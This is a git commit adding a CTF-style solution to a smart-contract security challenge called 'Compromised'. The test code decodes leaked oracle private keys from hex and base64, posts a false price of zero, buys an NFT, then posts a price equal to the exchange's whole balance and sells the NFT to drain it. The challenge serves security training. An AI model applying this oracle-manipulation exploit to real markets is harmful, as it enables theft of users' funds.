67e445c0066f429b10578a9f8ffd9118c941aea1
Javier <39586924+Arilucea@users.noreply.github.com>
2023-02-06 19:49:36 +0100

    Compromised solution

--- test/compromised/compromised.challenge.js
+++ test/compromised/compromised.challenge.js
@@ -53,6 +53,30 @@ describe('Compromised challenge', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+        // The data stream data we recevive from the server are the private keys of two of the oracle accounts
+        // enconding the data to get the keys we can use them change the price on the oracle to 0, buy a token,
+        // change again the price to the total ETH balance in the exchange and then sell our token to get all its balance
+        let capturePk1 = "4d 48 68 6a 4e 6a 63 34 5a 57 59 78 59 57 45 30 4e 54 5a 6b 59 54 59 31 59 7a 5a 6d 59 7a 55 34 4e 6a 46 6b 4e 44 51 34 4f 54 4a 6a 5a 47 5a 68 59 7a 42 6a 4e 6d 4d 34 59 7a 49 31 4e 6a 42 69 5a 6a 42 6a 4f 57 5a 69 59 32 52 68 5a 54 4a 6d 4e 44 63 7a 4e 57 45 35"
+        let capturePk2 = "4d 48 67 79 4d 44 67 79 4e 44 4a 6a 4e 44 42 68 59 32 52 6d 59 54 6c 6c 5a 44 67 34 4f 57 55 32 4f 44 56 6a 4d 6a 4d 31 4e 44 64 68 59 32 4a 6c 5a 44 6c 69 5a 57 5a 6a 4e 6a 41 7a 4e 7a 46 6c 4f 54 67 33 4e 57 5a 69 59 32 51 33 4d 7a 59 7a 4e 44 42 69 59 6a 51 34"
+
+        let base64 = Buffer.from(capturePk1.split(` `).join(``), `hex`).toString(`utf8`);
+		pk1 = Buffer.from(base64, `base64`).toString(`utf8`);
+        base64 = Buffer.from(capturePk2.split(` `).join(``), `hex`).toString(`utf8`);
+		pk2 = Buffer.from(base64, `base64`).toString(`utf8`);
+
+        const source1 = new ethers.Wallet(pk1, ethers.provider);
+        const source2 = new ethers.Wallet(pk2, ethers.provider);
+
+        await oracle.connect(source1).postPrice('DVNFT', 0);
+        await oracle.connect(source2).postPrice('DVNFT', 0);
+
+        let NFTBuyer = await (await ethers.getContractFactory('NFTBuyer', player)).deploy();
+        await NFTBuyer.buyToken(exchange.address, {value: 10});
+
+        await oracle.connect(source1).postPrice('DVNFT', EXCHANGE_INITIAL_ETH_BALANCE);
+        await oracle.connect(source2).postPrice('DVNFT', EXCHANGE_INITIAL_ETH_BALANCE);
+
+        await NFTBuyer.sellToken(nftToken.address);
     });
 
     after(async function () {
